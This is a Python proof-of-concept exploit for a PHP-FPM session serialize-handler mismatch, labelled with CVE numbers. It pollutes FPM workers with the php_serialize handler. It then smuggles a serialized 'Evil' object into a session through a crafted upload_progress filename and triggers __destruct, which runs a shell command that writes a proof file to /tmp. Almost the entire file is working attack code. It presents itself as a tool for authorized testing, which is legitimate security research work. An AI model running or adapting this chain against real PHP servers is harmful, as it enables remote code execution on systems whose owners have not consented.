#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session handler mismatch vulnerability.

Demonstrates:
  1. Pollute FPM worker with php_serialize handler
  2. Inject serialized object via upload_progress filename
  3. Trigger __destruct on clean worker with default handler

Usage:
  python3 verify_handler_mismatch.py --target http://127.0.0.1:18080

For authorized security testing only.
"""

import argparse
import socket
import sys
import uuid
from urllib.parse import urlparse

from lib import send_http, parse_target, detect_sapi


def send_pollute(host: str, port: int, path: str, tls: bool = False):
    """Send request to pollute endpoint that sets php_serialize handler."""
    return send_http(host, port, "GET", path, tls)


def send_inject(host: str, port: int, path: str, sid: str, payload: str, tls: bool = False):
    """Inject serialized object via upload_progress."""
    boundary = "VERIFY_MISMATCH"
    # Escape quotes for Content-Disposition
    escaped = payload.replace('"', '\\"')
    filename = f"x|{escaped}"
    
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    return send_http(host, port, "POST", path, tls,
                     headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                     body=body,
                     cookies={"PHPSESSID": sid})


def send_trigger(host: str, port: int, path: str, sid: str, tls: bool = False):
    """Trigger __destruct by hitting endpoint with default handler."""
    return send_http(host, port, "GET", path, tls,
                     cookies={"PHPSESSID": sid})


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--pollute-path", default="/app_serialize.php")
    ap.add_argument("--upload-path", default="/nosession.php")
    ap.add_argument("--trigger-path", default="/destruct_test.php")
    ap.add_argument("--sid", default="verifymismatch000000000000")
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80
    tls = u.scheme == 'https'

    sid = args.sid
    # Use Evil class gadget for verification
    payload = 'O:4:"Evil":1:{s:3:"cmd";s:32:"echo HANDLER_MISMATCH_WORKS > /tmp/mismatch_proof.txt;";}'

    print("[*] CVE-2026-109618/109619 — Handler Mismatch Verification")
    print(f"[*] Target: {args.target}")
    print(f"[*] SID: {sid}")
    print()

    # Step 1: Pollute workers
    print(f"[1] Polluting FPM workers via {args.pollute_path}...")
    for i in range(10):
        resp = send_pollute(host, port, args.pollute_path, tls)
        if args.verbose and resp:
            status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            print(f"    Pollute {i+1}: {status}")
    print("    → Workers should now have session.serialize_handler = php_serialize")

    # Step 2: Inject session with gadget
    print(f"[2] Injecting gadget via upload_progress at {args.upload_path}...")
    for i in range(20):
        resp = send_inject(host, port, args.upload_path, sid, payload, tls)
        if args.verbose and resp:
            status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            if i < 3:
                print(f"    Inject {i+1}: {status}")
    print("    → Session file should contain serialized Evil object")

    # Step 3: Trigger __destruct
    print(f"[3] Triggering __destruct via {args.trigger_path}...")
    resp = send_trigger(host, port, args.trigger_path, sid, tls)
    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        print(f"    Response: {status}")

    # Step 4: Check for proof
    import time
    time.sleep(0.5)
    print("[4] Checking for proof file...")
    # Try to hit index to see if proof was written
    check_resp = send_http(host, port, "GET", "/index.php", tls)
    if check_resp:
        print("    Target responded. Check /tmp/mismatch_proof.txt on target.")

    print()
    print("[*] Verification complete.")
    print("    If successful, target's /tmp/mismatch_proof.txt should contain:")
    print("    HANDLER_MISMATCH_WORKS")
    print()
    print("[*] Requirements for this chain:")
    print("    - PHP-FPM (persistent workers)")
    print("    - Endpoint setting serialize_handler=php_serialize (pollute_path)")
    print("    - Autoloaded class with __destruct gadget (trigger_path)")
    print("    - session.upload_progress.enabled = On (default)")


if __name__ == "__main__":
    main()